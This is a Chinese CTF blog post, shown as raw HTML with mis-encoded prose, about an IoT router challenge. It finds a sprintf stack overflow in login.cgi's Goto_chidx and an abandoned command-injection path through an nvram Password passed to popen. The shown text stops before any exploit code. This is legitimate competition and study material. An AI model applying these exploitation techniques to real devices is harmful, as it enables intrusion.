<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€å¾ˆä¹…æ²¡å‘è¿‡ CTF çš„ writeup äº†ï¼Œæ°´ä¸€ç¯‡ CTF-IOT çš„ã€‚å‰å‡ å¤©è¢«å­¦å¼Ÿå–Šç€çœ‹äº†ä¸€é“è¥¿æ¹–è®ºå‰‘çš„ IOT é¢˜ç›®ï¼Œåšé¢˜çš„æ—¶å€™å¿˜è®°çœ‹ ASLR ç­‰çº§äº†ã€‚å› æ­¤è¢«ä¸€ä¸ªè™šå‡çš„åœ°å€éšæœºåŒ–å›°æ‰°äº†è®¸ä¹…â€¦â€¦æ²¡æœ‰åœ°å€éšæœºåŒ–ä¹‹åæœç„¶é€šç•…å¤šäº†ğŸ«¡ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘åˆèµ›IOT-linkonçš„wp">
<meta property="og:url" content="https://zikh26.github.io/posts/65d308c5.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="å‰è¨€å¾ˆä¹…æ²¡å‘è¿‡ CTF çš„ writeup äº†ï¼Œæ°´ä¸€ç¯‡ CTF-IOT çš„ã€‚å‰å‡ å¤©è¢«å­¦å¼Ÿå–Šç€çœ‹äº†ä¸€é“è¥¿æ¹–è®ºå‰‘çš„ IOT é¢˜ç›®ï¼Œåšé¢˜çš„æ—¶å€™å¿˜è®°çœ‹ ASLR ç­‰çº§äº†ã€‚å› æ­¤è¢«ä¸€ä¸ªè™šå‡çš„åœ°å€éšæœºåŒ–å›°æ‰°äº†è®¸ä¹…â€¦â€¦æ²¡æœ‰åœ°å€éšæœºåŒ–ä¹‹åæœç„¶é€šç•…å¤šäº†ğŸ«¡ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123164724316.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123164857957.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165045014.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165228148.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165926420.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170101040.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170328905.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170443076.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123175903992.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123180128251.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123180258428.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123192816826.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123192838461.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193428597.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193722188.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123193920680.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123194343193.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123195044007.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123201505855.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123203154312.png">
<meta property="article:published_time" content="2025-01-23T12:51:57.002Z">
<meta property="article:modified_time" content="2025-01-23T12:55:43.464Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="MIPSæ¶æ„">
<meta property="article:tag" content="æ ˆæº¢å‡º">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123164724316.png">


<link rel="canonical" href="https://zikh26.github.io/posts/65d308c5.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/65d308c5.html","path":"posts/65d308c5.html","title":"ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘åˆèµ›IOT-linkonçš„wp"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘åˆèµ›IOT-linkonçš„wp | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-å‹é“¾"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%83%AD%E8%BA%AB%E8%BF%90%E5%8A%A8"><span class="nav-number">2.</span> <span class="nav-text">çƒ­èº«è¿åŠ¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">å¼€å§‹åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%B4%E6%8E%A5%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">4.</span> <span class="nav-text">é—´æ¥å‘½ä»¤æ³¨å…¥ï¼Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">æº¢å‡ºæ¼æ´åˆ©ç”¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">6.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">å‚è€ƒæ–‡ç« </span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">äººç”Ÿå¦‚æˆ</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">119</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">117</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/65d308c5.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="äººç”Ÿå¦‚æˆ">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘åˆèµ›IOT-linkonçš„wp | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ç¬¬å…«å±Šè¥¿æ¹–è®ºå‰‘åˆèµ›IOT-linkonçš„wp
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2025-01-23 20:51:57 / ä¿®æ”¹æ—¶é—´ï¼š20:55:43" itemprop="dateCreated datePublished" datetime="2025-01-23T20:51:57+08:00">2025-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOTå®‰å…¨</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">èµ›é¢˜WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¾ˆä¹…æ²¡å‘è¿‡ CTF çš„ writeup äº†ï¼Œæ°´ä¸€ç¯‡ CTF-IOT çš„ã€‚å‰å‡ å¤©è¢«å­¦å¼Ÿå–Šç€çœ‹äº†ä¸€é“è¥¿æ¹–è®ºå‰‘çš„ IOT é¢˜ç›®ï¼Œåšé¢˜çš„æ—¶å€™å¿˜è®°çœ‹ <code>ASLR</code> ç­‰çº§äº†ã€‚å› æ­¤è¢«ä¸€ä¸ªè™šå‡çš„åœ°å€éšæœºåŒ–å›°æ‰°äº†è®¸ä¹…â€¦â€¦æ²¡æœ‰åœ°å€éšæœºåŒ–ä¹‹åæœç„¶é€šç•…å¤šäº†ğŸ«¡ã€‚</p>
<span id="more"></span>

<h3 id="çƒ­èº«è¿åŠ¨"><a href="#çƒ­èº«è¿åŠ¨" class="headerlink" title="çƒ­èº«è¿åŠ¨"></a>çƒ­èº«è¿åŠ¨</h3><p>é¢˜ç›®ç»™äº†è™šæ‹Ÿæœºé•œåƒå’Œå¯åŠ¨è„šæœ¬ï¼Œä½†ä¸ºäº†åç»­è¿œç¨‹è°ƒè¯•ï¼Œå†ä¿®æ”¹ä¸€ä¸‹å¯åŠ¨è„šæœ¬ï¼ˆåŠ ä¸€ä¸ªç«¯å£æ˜ å°„hostfwd&#x3D;tcp::9999-:9999ï¼‰ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;  -net user,hostfwd=tcp::80-:80,hostfwd=tcp::2222-:22,hostfwd=tcp::9999-:9999 -net nic -nographic</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæŠ¥é”™ <code>qemu-system-mipsel: -net user,hostfwd=tcp::80-:80,hostfwd=tcp::2222-:22,hostfwd=tcp::9999-:9999: network backend &#39;user&#39; is not compiled into this binary</code> è¡¨ç¤ºä¸æ”¯æŒ <code>user</code> ç½‘ç»œåç«¯ã€‚éœ€è¦é‡æ–°ç¼–è¯‘å®‰è£… <code>QEMU</code>ã€‚</p>
<p>ç³»ç»Ÿæ­£å¸¸å¯åŠ¨åï¼Œç”¨æˆ·åå’Œå¯†ç è¾“å…¥ <code>root</code> ç™»å½•ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™åœ¨æµè§ˆå™¨è®¿é—®å®¿ä¸»æœºçš„ <code>IP</code> åº”è¯¥ä¼šå‡ºç°ä»¥ä¸‹ç•Œé¢ï¼Œè¡¨ç¤ºèµ›é¢˜æ­£å¸¸å¯åŠ¨ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123164724316.png" alt="image-20250123164724316" style="zoom: 50%;" />



<p>éšä¾¿è¾“å…¥ä¸€ä¸ªå¯†ç ç™»å½•ï¼ŒæŠ“ä¸€ä¸ªåŒ…å‘ç°è¯·æ±‚çš„æ˜¯ <code>/cgi-bin/login.cgi</code>ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123164857957.png" alt="image-20250123164857957" style="zoom: 50%;" />



<p>ç”¨ <code>find ./ -name &quot;*.cgi&quot;</code> å®šä½ä¸€ä¸‹ <code>login.cgi</code> çš„ä½ç½®ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165045014.png" alt="image-20250123165045014"></p>
<p>å‘ç° <code>login.cgi</code> æ˜¯ <code>mips32</code> å°ç«¯åºï¼Œå¹¶ä¸”ä¿æŠ¤å…¨å…³ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165228148.png" alt="image-20250123165228148"></p>
<h3 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h3><p>æ¥ä¸‹æ¥å°±æ˜¯å»åˆ†æå‡ ä¸ª <code>cgi</code> æ–‡ä»¶ï¼Œæ¼æ´å…¶å®æ¯”è¾ƒæ˜æ˜¾å°±ä½äº <code>login.cgi</code>æ–‡ä»¶ã€‚<code>web_get</code> å‡½æ•°ç”¨æ¥è§£ææ•°æ®åŒ…ä¸­çš„å­—æ®µï¼Œæ¯”å¦‚åœ¨ <code>main</code> å‡½æ•°ä¸­æœ‰ä»£ç  <code>v36 = (const char *)web_get(&quot;page&quot;, v3, 0);</code>ï¼Œé‚£ä¹ˆ <code>page</code> å­—æ®µçš„å€¼å°±ä¼šè¢«è§£æåˆ° <code>v36</code> å˜é‡ä¸­ã€‚å½“ <code>page</code> å­—æ®µä¸º <code>Goto_chidx</code> æ—¶ï¼Œé‚£ä¹ˆå°±é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨äº† <code>Goto_chidx</code> å‡½æ•°ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123165926420.png" alt="image-20250123165926420"></p>
<p> <code>Goto_chidx</code> å‡½æ•°ä¸­çš„æ¼æ´å¾ˆæ˜æ˜¾ï¼Œä» <code>wlanUrl</code> ä¸­è§£æçš„å­—æ®µæ²¡æœ‰ç»è¿‡æ ¡éªŒå°±ç”¨ <code>sprintf</code> å‡½æ•°æ‹¼æ¥ï¼Œä»è€Œå¯¼è‡´äº†æ ˆæº¢å‡ºã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170101040.png" alt="image-20250123170101040" style="zoom:50%;" />



<p>è¿™é‡Œçš„æ¼æ´éªŒè¯ä¹Ÿéå¸¸ç®€å•ï¼Œå½“ <code>wlanUrl</code> å­—æ®µçš„å­—ç¬¦ä¸²æ¯”è¾ƒçŸ­æ—¶ï¼Œå“åº”æ•°æ®åŒ…çš„çŠ¶æ€ç æ˜¯ <code>302</code>ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170328905.png" alt="image-20250123170328905"></p>
<p>ç„¶åæŠŠ <code>wlanUrl</code> å­—æ®µçš„å­—ç¬¦ä¸²å†™é•¿ä¸€äº›ï¼Œå°±è¿”å›äº† <code>500</code> è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨å‡ºç°é”™è¯¯ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123170443076.png" alt="image-20250123170443076"></p>
<p>å…¶å®å®šä½åˆ°æ¼æ´è¿™é‡Œç”¨çš„æ—¶é—´è¿˜æ˜¯å¾ˆçŸ­çš„ï¼Œä½†æ˜¯å› ä¸º <code>sprintf</code> å‡½æ•°é€ æˆçš„æ ˆæº¢å‡ºä¼šå­˜åœ¨ <code>\x00</code> æˆªæ–­é—®é¢˜å¯¼è‡´ä¸èƒ½åˆ©ç”¨ <code>cgi</code> æœ¬èº«çš„ç¨‹åºåœ°å€è¿›è¡Œ <code>ROP</code>ã€‚ç”±äºæˆ‘ä¸€ç›´æ²¡æœ‰æ„è¯†åˆ° <code>ASLR</code> æ˜¯ <code>0</code>ï¼ˆä¸‹æ„è¯†ä»¥ä¸º <code>ASLR</code> å¼€çš„æ˜¯ <code>2</code>ï¼Œå¿˜è®°çœ‹ <code>/proc/sys/kernel/randomize_va_space</code> çš„å€¼äº† ORZï¼‰ï¼Œå¦‚æœæŠŠè¿™é“é¢˜å½“åš <code>ASLR</code> ä¸º <code>2</code> ï¼Œåœ¨ <code>libc</code> åœ°å€æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆåŠæ³•ç¨³å®šçš„ <code>RCE</code>ã€‚</p>
<h3 id="é—´æ¥å‘½ä»¤æ³¨å…¥ï¼Ÿ"><a href="#é—´æ¥å‘½ä»¤æ³¨å…¥ï¼Ÿ" class="headerlink" title="é—´æ¥å‘½ä»¤æ³¨å…¥ï¼Ÿ"></a>é—´æ¥å‘½ä»¤æ³¨å…¥ï¼Ÿ</h3><p>äºæ˜¯ä¹æˆ‘çš„æ€è·¯å½»åº•è·‘åï¼Œæˆ‘åˆå»åˆ†æäº†å…¶ä»–å‡½æ•°ä»¥åŠå…¶ä»–æ–‡ä»¶ã€‚åœ¨æ¯”èµ›çš„æ—¶å€™ï¼Œæˆ‘å‘ç°ä¼¼ä¹è¿˜æœ‰ä¸€ä¸ªé—´æ¥çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå°±ä½äº <code>sys_login</code> å‡½æ•°ã€‚è™½ç„¶ <code>sys_login</code> å‡½æ•°ä¸­å¯¹äºå¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„åœ°æ–¹å¾ˆè°¨æ…ï¼Œéƒ½è¿›è¡Œäº†è¿‡æ»¤ã€‚ä½†ä»ç„¶å­˜åœ¨ä¸‹é¢çš„ä»£ç ï¼Œä» <code>nvram</code> ä¸­è¯»å–çš„ <code>Password</code> å­—æ®µç›´æ¥æ‹¼æ¥åˆ°äº† <code>v91</code>ï¼Œç»è¿‡ <code>sprintf</code> æ‹¼æ¥åç»™åˆ° <code>popen</code> æ‰§è¡Œã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v115 = (<span class="type">char</span> *)nvram_bufget(<span class="number">0</span>, <span class="string">&quot;Password&quot;</span>);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)v91, src);</span><br><span class="line"><span class="built_in">strcat</span>((<span class="type">char</span> *)v91, v115);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">sprintf</span>(v93, <span class="string">&quot;echo -n &#x27;%s&#x27; | md5sum&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v91);</span><br><span class="line">v68 = popen(v93, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æˆ‘åˆæ‰¾äº†ä¸€ä¸‹å¯ä»¥è®¾ç½® <code>nvram</code> ä¸­ <code>Password</code> çš„ä»£ç ã€‚å½“ <code>page</code> å­—æ®µä¸º <code>sysinit</code> æ—¶ï¼Œå¯ä»¥è°ƒç”¨ <code>set_sys_init</code> å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v5 = (<span class="type">const</span> <span class="type">char</span> *)web_get(<span class="string">&quot;newpass&quot;</span>, a1, <span class="number">0</span>);</span><br><span class="line">v45 = strdup(v5);</span><br><span class="line">......</span><br><span class="line">nvram_bufset(<span class="number">0</span>, <span class="string">&quot;Password&quot;</span>, v45);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™çœ‹ä¸Šé¢è¿™éƒ¨åˆ†ï¼Œä¼¼ä¹é€»è¾‘ä¹Ÿæ˜¯é€šé¡ºçš„ï¼Œé—´æ¥æ§åˆ¶ <code>nvram</code> ä¸­çš„  <code>Password</code> å­—æ®µè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚åœ¨æ¯”èµ›æœŸé—´è¿™ä¸ªåœ°æ–¹å’Œæº¢å‡ºæ¼æ´æˆ‘éƒ½çœ‹åˆ°äº†ï¼Œä½†æ„å‘³æ˜¯å­˜åœ¨ <code>so</code> åº“åœ°å€éšæœºåŒ–ï¼Œæƒ³ç€å‘½ä»¤æ³¨å…¥è‚¯å®šæ¯”æº¢å‡ºæ¼æ´åˆ©ç”¨ç¨³å®šï¼Œå› æ­¤æˆ‘çš„ç²¾åŠ›éƒ½æ”¾åœ¨äº†å‰è€…ä¸Šé¢ğŸ˜…ã€‚</p>
<p>é—´æ¥å‘½ä»¤æ³¨å…¥å¤±è´¥çš„åŸå› æ˜¯åœ¨ <code>set_sys_init</code> è°ƒç”¨ <code>check_valid_user</code> å‡½æ•°åˆ¤æ–­äº†è¿”å›å€¼ ã€‚<code>check_valid_user</code> å®šä¹‰åœ¨ <code>libwebutil.so</code> åº“ä¸­ï¼Œå…·ä½“é€»è¾‘æ²¡æœ‰ä»”ç»†çœ‹äº†ï¼Œä½†è‚¯å®šæ˜¯æ£€æŸ¥é‰´æƒèº«ä»½çš„ã€‚ä¸è¿‡ç”±äºæ²¡åŠæ³•ç™»å½•è·¯ç”±å™¨ï¼ˆè¿™ä¸ª <code>nvram</code> åœ¨ç³»ç»Ÿç¯å¢ƒé‡Œæ²¡æœ‰ï¼‰ï¼Œå› æ­¤ä¹Ÿä¸å­˜åœ¨ç™»å½•è·å–å‡­è¯äº†ã€‚åé¢å†æ‹è¿‡å¤´çœ‹æº¢å‡ºæ¼æ´çš„æ—¶å€™ï¼Œå…¶å®å·²ç»æ²¡å¤šå°‘æ—¶é—´äº†ï¼Œå› ä¸ºä¸€ç›´æ²¡æœ‰æ³¨æ„åˆ° <code>ASLR</code> ä¸º <code>0</code>ï¼Œæ‰€ä»¥æ¯”èµ›ç»“æŸä¹Ÿæ²¡åšå‡ºæ¥ã€‚ç­‰åˆ°å®˜æ–¹ <code>WP</code> å‡ºæ¥ï¼Œçœ‹å®Œæ‰å‘ç°  <code>ASLR</code> ä¸º <code>0</code>ğŸ˜­ã€‚</p>
<h3 id="æº¢å‡ºæ¼æ´åˆ©ç”¨"><a href="#æº¢å‡ºæ¼æ´åˆ©ç”¨" class="headerlink" title="æº¢å‡ºæ¼æ´åˆ©ç”¨"></a>æº¢å‡ºæ¼æ´åˆ©ç”¨</h3><p><code>ASLR</code> ä¸º <code>0</code> ä»£è¡¨æ‰€æœ‰åœ°å€éƒ½æ˜¯å›ºå®šçš„ï¼Œå› æ­¤æ ˆåœ°å€å’Œ <code>libc</code> åœ°å€éšä¾¿ç”¨ï¼Œè¿™äº›åœ°å€éƒ½æ˜¯å››ä¸ªå­—èŠ‚ä¸ä¼šå‡ºç° <code>\x00</code> æˆªæ–­çš„é—®é¢˜ã€‚åœ¨ <code>Goto_chidx</code> å‡½æ•°è¿”å›æ—¶ï¼Œå¯ä»¥æ§åˆ¶è¿™äº›å¯„å­˜å™¨ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250123175903992.png" alt="image-20250123175903992"></p>
